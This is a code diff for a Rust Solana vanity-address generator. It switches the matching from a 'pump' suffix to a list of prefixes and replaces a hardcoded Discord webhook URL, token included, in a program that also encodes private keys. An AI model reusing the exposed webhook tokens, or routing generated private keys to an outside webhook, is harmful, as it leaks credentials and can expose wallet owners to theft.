@@ -9,12 +9,22 @@ use cuda_helpers::CudaDevice;
 use solana_sdk::signature::{Keypair, Signer};
 use rayon::prelude::*;
 
-const DISCORD_WEBHOOK_URL: &str = "https://discord.com/api/webhooks/1475820796642463917/BKArJY5qsQnpLzytJ3By1YUeaFZjSJjAnPOBEsUetusT8awG0NiWzOuzkFW70lXoXbDD";
+const DISCORD_WEBHOOK_URL: &str = "https://discord.com/api/webhooks/1480150987996921876/X_HPCkDROSVEq2epQCRLQ4-Bz1MKnxiCkkbo0lwW4ybUE5_iPU-j7Mu4ZbFwKUC8H_1-";
 const BATCH_SIZE: usize = 100_000; // Parallel batch size
 
+const PREFIXES: &[&str] = &[
+    "solana",
+    "so1111",
+    "1234567",
+    "777777",
+    "666666",
+    "111111",
+    "999999",
+];
+
 fn main() {
-    println!("{}", "\n🚀 Solana Pump Address Generator".bright_cyan().bold());
-    println!("{}", "Searching for addresses ending with 'pump' (case-sensitive)".yellow());
+    println!("{}", "\n🚀 Solana Prefix Address Generator".bright_cyan().bold());
+    println!("{}", format!("Searching for addresses starting with: {}", PREFIXES.join(", ")).yellow());
     println!("{}", "=" .cyan());
 
     // Initialize CUDA
@@ -53,7 +63,8 @@ fn generate_pump_addresses_parallel() {
                 let keypair = Keypair::new();
                 let address = keypair.pubkey().to_string();
                 let private_key = bs58::encode(keypair.to_bytes()).into_string();
-                let is_match = address.ends_with("pump");
+                let address_lower = address.to_lowercase();
+                let is_match = PREFIXES.iter().any(|prefix| address_lower.starts_with(&prefix.to_lowercase()));
                 (address, private_key, is_match)
             })
             .collect();
